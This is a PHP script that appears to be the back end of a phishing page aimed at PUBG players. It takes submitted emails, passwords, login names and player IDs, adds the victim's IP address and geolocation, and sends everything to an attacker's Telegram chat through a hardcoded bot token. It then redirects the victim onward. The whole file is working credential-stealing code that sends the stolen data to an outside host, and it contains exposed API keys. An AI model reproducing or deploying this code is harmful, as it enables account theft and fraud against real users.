<?php
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$playid = $_POST['playid'];
$level = $_POST['level'];
$API_KEY = '1931977814:AAEPptNkxjNiv8I-neIQj3BRlwOFp0oAyj0';//TOKIN
define('API_KEY',$API_KEY);
function bot($method,$datas=[]){
    $mr = http_build_query($datas);
        $url = "https://api.telegram.org/bot".API_KEY."/".$method."?$mr";
        $mrvenom = file_get_contents($url);
        return json_decode($mrvenom);
    }
    function getUserIP()
    {
        // Get real visitor IP behind CloudFlare network
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
    
        return $ip;
    }

$ip = getUserIP();
$api = json_decode(file_get_contents("http://api.ipstack.com/".$ip."?access_key=46fe2d101482e11d5a51d0ab25ad277a"));
$country_name = $api->country_name;
$calling_code = $api->location->calling_code;
$ip = $api->ip;
$jsondata = json_decode($cty1);
$cty = $jsondata->data[0]->country;
$year = date('Y');
$month = date('n');
$day = date('j');
$time = date("Y-m-d h:i:s");
$admin = "831161538";//Id
bot("sendMessage",[
"chat_id"=>$admin,
"text"=>"
♕Ꮋi  
༺༺༺༺༺༺ @PHP505 ༻༻༻༻༻༻
༺ ʟᴏɢɪɴ ~ `$login`
༺ ᴇᴍᴀɪʟ ~ `$email`
༺ ᴘᴀssᴡᴏʀᴅ ~ `$password`
༺ 𝚃𝚑𝚎 𝙿𝚑𝚘𝚗𝚎 ~ `$phone`
༺ ᴘʟᴀʏᴇʀ ɪᴅ ~ `$playid`
༺ ᴀᴄᴄ ʟᴇᴠᴇʟ ~   $level
༺ 𝙸𝙿  ~        $ip
༺ 𝙳𝙰𝚃𝙴  ~     $time
༺ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ ~ `+$calling_code`
༺ ᴄᴏᴜɴᴛʀʏ ɴᴀᴍᴇ ~ `$country_name`
༺ By :  ~ @PHP505
༺༺༺༺༺༺ @PHP505 ༻༻༻༻༻༻
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
header('Location: https://verifyac.com/PUBG/M.php');
